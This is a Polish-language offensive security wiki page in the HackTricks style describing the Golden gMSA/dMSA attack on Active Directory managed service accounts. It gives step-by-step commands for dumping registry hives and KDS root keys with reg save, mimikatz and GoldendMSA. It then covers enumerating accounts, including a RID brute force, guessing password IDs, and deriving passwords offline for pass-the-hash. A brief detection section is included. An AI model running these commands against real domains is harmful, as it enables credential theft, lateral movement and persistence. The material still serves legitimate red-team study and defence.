# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Windows Managed Service Accounts (MSA) to specjalne principals zaprojektowane do uruchamiania usług bez konieczności ręcznego zarządzania ich hasłami.
Istnieją dwa główne warianty:

1. **gMSA** – group Managed Service Account – może być używane na wielu hostach autoryzowanych w jego atrybucie `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – (preview) następca gMSA, opierający się na tej samej kryptografii, ale umożliwiający bardziej granularne scenariusze delegacji.

W przypadku obu wariantów **hasło nie jest przechowywane** na każdym Domain Controller (DC) jak zwykły NT-hash. Zamiast tego każdy DC może wyprowadzić bieżące hasło w locie na podstawie:

* obejmującego cały forest **KDS Root Key** (`KRBTGT\KDS`) – losowo wygenerowany secret nazwany za pomocą GUID, replikowany do każdego DC w kontenerze `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* docelowego konta **SID**.
* przypisanego do konta **ManagedPasswordID** (GUID), znajdującego się w atrybucie `msDS-ManagedPasswordId`.

Proces wyprowadzania to: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-bajtowy blob, który jest następnie **base64-encoded** i przechowywany w atrybucie `msDS-ManagedPassword`.
Podczas normalnego użycia hasła nie jest wymagany żaden ruch Kerberos ani interakcja z domeną – host członkowski wyprowadza hasło lokalnie, o ile zna te trzy dane wejściowe.

## Golden gMSA / Golden dMSA Attack

Jeśli attacker zdobędzie wszystkie trzy dane wejściowe **offline**, może obliczyć **aktualne i przyszłe hasła** dla **dowolnego gMSA/dMSA w forest**, bez ponownego kontaktowania się z DC, omijając:<sup>[[1]](#references)[[2]](#references)</sup>

* audyt odczytów LDAP
* interwały zmiany haseł (hasła można obliczyć z wyprzedzeniem)

Jest to analogiczne do *Golden Ticket* dla service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Wymagania wstępne

1. **Forest-level compromise** **jednego DC** (lub Enterprise Admin), albo dostęp `SYSTEM` do jednego z DC w forest.
2. Możliwość enumeracji service accounts (odczyt LDAP / RID brute-force).
3. Workstation x64 z .NET ≥ 4.7.2 do uruchomienia [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) lub równoważnego kodu.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Zrzut z dowolnego DC (Volume Shadow Copy / surowe ulepszenia SAM+SECURITY lub remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Ciąg base64 oznaczony jako `RootKey` (nazwa GUID) jest wymagany w kolejnych krokach.<sup>[[1]](#references)[[2]](#references)</sup>

##### Faza 2 – Wyliczanie obiektów gMSA / dMSA

Pobierz co najmniej `sAMAccountName`, `objectSid` oraz `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementuje tryby pomocnicze:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Faza 3 – Zgadnij / odkryj ManagedPasswordID (gdy brakuje)

Niektóre wdrożenia *usuwają* `msDS-ManagedPasswordId` z odczytów chronionych przez ACL.  
Ponieważ GUID ma 128 bitów, naiwny bruteforce jest niewykonalny, ale:

1. Pierwsze **32 bity = czas Unix epoch** utworzenia konta (z dokładnością do minut).
2. Następne 96 bitów jest losowych.

Dlatego realistyczne jest użycie wąskiej wordlisty dla każdego konta (± kilka godzin).
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Narzędzie oblicza hasła kandydujące i porównuje ich blob base64 z rzeczywistym atrybutem `msDS-ManagedPassword` — zgodność ujawnia prawidłowy GUID.

##### Faza 4 — Obliczanie i konwersja hasła offline

Gdy znany jest ManagedPasswordID, uzyskanie prawidłowego hasła wymaga wykonania tylko jednego polecenia:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Wynikowe hashe można wstrzyknąć za pomocą **mimikatz** (`sekurlsa::pth`) lub **Rubeus** w celu nadużycia Kerberos, umożliwiając skryte **lateral movement** i **persistence**.

## Wykrywanie i ograniczanie skutków

* Ogranicz możliwości wykonywania **kopii zapasowych DC i odczytu rejestru hive** do administratorów Tier-0.
* Monitoruj tworzenie **Directory Services Restore Mode (DSRM)** lub **Volume Shadow Copy** na DC.
* Audytuj odczyty / zmiany w `CN=Master Root Keys,…` oraz flagach `userAccountControl` kont usług.
* Wykrywaj nietypowe zapisy haseł **base64** lub nagłe ponowne użycie haseł usług na wielu hostach.
* Rozważ konwersję uprzywilejowanych gMSA do **classic service accounts** z regularną, losową rotacją haseł, gdy izolacja Tier-0 nie jest możliwa.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementacja referencyjna użyta na tej stronie.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementacja referencyjna użyta na tej stronie.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket przy użyciu wyprowadzonych kluczy AES.

## References

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
